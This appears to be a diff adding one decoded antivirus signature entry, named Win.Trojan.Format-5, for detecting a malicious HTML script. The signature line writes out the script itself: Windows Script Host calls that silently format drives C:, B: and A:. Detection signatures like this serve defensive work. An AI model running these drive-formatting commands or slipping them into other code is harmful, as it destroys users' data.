@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Format-5
+TARGET TYPE: HTML
+OFFSET: *
+DECODED SIGNATURE:
+wsh.run('start /m format.com c:/q /autotest /u'); wsh.run('start /m format.com b:/q /autotest /u'); wsh.run('start /m format.com a:/q /autotest /u'); </script>
